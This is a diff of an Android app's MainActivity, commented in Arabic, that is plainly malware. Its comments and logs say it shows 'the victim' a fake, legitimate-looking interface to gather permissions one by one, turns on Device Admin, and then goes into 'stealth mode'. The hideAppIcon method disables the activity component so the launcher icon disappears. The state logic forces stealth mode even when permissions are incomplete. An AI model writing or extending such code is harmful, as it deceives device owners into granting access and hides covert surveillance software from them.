@@ -24,9 +24,11 @@ import androidx.core.content.ContextCompat;
  * MainActivity - نقطة الدخول الرئيسية
  * ============================================================
  * ★ استراتيجية العمل:
- * 1. أول مرة: نعرض UI وهمي لجمع الصلاحيات
- * 2. بعد جمع الصلاحيات: نخفي الأيقونة + نشغل الخدمات + نقفل
- * 3. أي فتح لاحق: نشغل الخدمات ونقفل فورًا
+ * 1. الضحية تفتح التطبيق من الأيقونة
+ * 2. نعرض UI وهمي (يبدو شرعي)
+ * 3. نجمع الصلاحيات واحدة واحدة
+ * 4. نفعل Device Admin
+ * 5. نخفي الأيقونة + نقفل النشاط
  * ============================================================
  */
 public class MainActivity extends Activity {
@@ -127,7 +129,7 @@ public class MainActivity extends Activity {
         Log.d(TAG, "[STATE] firstLaunchDone=" + firstLaunchDone
                 + " | permissionsDone=" + permissionsDone);
 
-        // ★★★ لو أول مرة → اعرض UI ★★★
+        // ★★★ أول مرة → اعرض UI ★★★
         if (!firstLaunchDone) {
             Log.d(TAG, "[FIRST-RUN] ★ Showing fake UI for permissions ★");
             permissionsList = getPermissionsList();
@@ -136,16 +138,14 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // ★★★ لو الصلاحيات خلصت → الوضع الخفي ★★★
+        // ★★★ الصلاحيات خلصت → الوضع الخفي ★★★
         if (permissionsDone) {
             Log.d(TAG, "[STEALTH] App already initialized — activating stealth mode");
             activateStealthMode();
             return;
         }
 
-        // ★★★ حالة غريبة: firstLaunchDone=true بس permissionsDone=false ★★★
-        // ★ ده معناه إن الضحية قفل التطبيق قبل ما يخلص الصلاحيات
-        // ★ فعّل الوضع الخفي على أي حال ★★★
+        // ★★★ حالة غريبة ★★★
         Log.d(TAG, "[RECOVERY] Permissions incomplete — forcing stealth mode");
         activateStealthMode();
     }
@@ -168,7 +168,7 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // Flow - التدفق الوهمي
+    // Flow
     // ============================================================
     private void startFlow() {
         ui.showWelcomeScreen(() -> {
@@ -390,7 +390,6 @@ public class MainActivity extends Activity {
         try {
             if (ui != null) {
                 ui.showSuccessScreen(() -> {
-                    // ★★★ احفظ flag إن الصلاحيات خلصت ★★★
                     getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                             .edit()
                             .putBoolean(KEY_FIRST_LAUNCH, true)
@@ -449,6 +448,9 @@ public class MainActivity extends Activity {
         }
     }
 
+    // ============================================================
+    // ★★★ hideAppIcon - الأهم: إخفاء الأيقونة ★★★
+    // ============================================================
     private void hideAppIcon() {
         try {
             SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
@@ -459,6 +461,9 @@ public class MainActivity extends Activity {
             }
 
             PackageManager pm = getPackageManager();
+
+            // ★★★ نعطّل الـ MainActivity component بالكامل ★★★
+            // ★ ده بيخلي الأيقونة تختفي من الـ launcher ★★★
             ComponentName componentName = new ComponentName(this, MainActivity.class);
 
             pm.setComponentEnabledSetting(
@@ -468,7 +473,7 @@ public class MainActivity extends Activity {
             );
 
             prefs.edit().putBoolean(KEY_HIDDEN, true).apply();
-            Log.d(TAG, "[HIDE] App icon hidden successfully");
+            Log.d(TAG, "[HIDE] ★ App icon hidden successfully ★");
         } catch (Exception e) {
             Log.e(TAG, "[HIDE] error: " + e.getMessage());
         }
@@ -516,4 +521,4 @@ public class MainActivity extends Activity {
             }
         } catch (Exception ignored) {}
     }
-                     }
+                }
